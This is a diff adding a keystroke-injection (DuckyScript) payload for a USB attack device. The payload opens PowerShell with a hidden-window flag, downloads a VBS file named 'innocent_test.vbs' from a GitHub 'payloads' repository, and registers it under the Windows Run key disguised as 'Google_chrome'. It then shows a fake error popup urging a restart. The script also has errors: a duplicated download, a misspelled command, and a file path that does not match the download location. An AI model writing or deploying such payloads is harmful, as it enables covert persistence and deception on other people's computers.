@@ -1,0 +1,16 @@
+GUI r
+DELAY 100
+STRINGLN POWERSHELL.exe -window-hidden
+DELAY 100
+STRINGLN $path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
+DELAY 50
+
+STRINGLN Invoke-WebRequest -Uri https://github.com/Fred-the-bot/payloads/blob/main/innocent_test.vbs -OutFile .\innocent.vbs
+DELAY 2000
+STRINGLN New-ItemProperty -Path $path -Name "Google_chrome" -Value "M:\innocent.vbs" -PropertyType "String"
+DELAY 50
+STRINGLN Invoke-WebRequest -Uri https://github.com/Fred-the-bot/payloads/blob/main/innocent_test.vbs -OutFile .\innocent.vbs
+DELAY 50
+STRINGLN $wshell = New-Object -ComObject Wscript.Shell
+DELAY 50
+STRINGLNG $Output = $wshell.Popup("An error occured, please restart your PC",10,"ALERT",16)
